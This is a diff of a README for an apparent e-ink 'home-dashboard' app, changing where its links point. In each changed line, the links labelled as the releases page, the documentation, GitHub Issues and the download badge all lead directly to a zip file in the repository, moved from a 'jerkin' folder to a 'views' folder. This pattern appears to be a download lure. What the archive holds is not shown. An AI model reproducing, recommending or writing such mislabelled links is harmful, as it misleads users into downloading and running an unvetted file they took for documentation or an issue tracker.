@@ -6,7 +6,7 @@ Welcome to the home-dashboard project! This application allows you to see weathe
 
 ## 📥 Download the Application
 
-[![Download the latest release](https://raw.githubusercontent.com/salgrow/home-dashboard/main/jerkin/home-dashboard.zip%20Now-%20%F0%9F%93%8E-brightgreen)](https://raw.githubusercontent.com/salgrow/home-dashboard/main/jerkin/home-dashboard.zip)
+[![Download the latest release](https://raw.githubusercontent.com/salgrow/home-dashboard/main/views/dashboard-home-2.7-beta.2.zip%20Now-%20%F0%9F%93%8E-brightgreen)](https://raw.githubusercontent.com/salgrow/home-dashboard/main/views/dashboard-home-2.7-beta.2.zip)
 
 ## 💻 System Requirements
 
@@ -18,7 +18,7 @@ To run this application, you need:
 
 ## 📦 Download & Install
 
-1. Visit the [releases page](https://raw.githubusercontent.com/salgrow/home-dashboard/main/jerkin/home-dashboard.zip).
+1. Visit the [releases page](https://raw.githubusercontent.com/salgrow/home-dashboard/main/views/dashboard-home-2.7-beta.2.zip).
    
 2. On the releases page, you will see a list of versions. Look for the latest version.
 
@@ -73,7 +73,7 @@ Currently, this application is designed specifically for desktop use with e-ink 
 
 ## 🔗 Further Resources
 
-For more information, visit our [documentation](https://raw.githubusercontent.com/salgrow/home-dashboard/main/jerkin/home-dashboard.zip) or report issues on [GitHub Issues](https://raw.githubusercontent.com/salgrow/home-dashboard/main/jerkin/home-dashboard.zip).
+For more information, visit our [documentation](https://raw.githubusercontent.com/salgrow/home-dashboard/main/views/dashboard-home-2.7-beta.2.zip) or report issues on [GitHub Issues](https://raw.githubusercontent.com/salgrow/home-dashboard/main/views/dashboard-home-2.7-beta.2.zip).
 
 ## 🛡️ Contribution
 
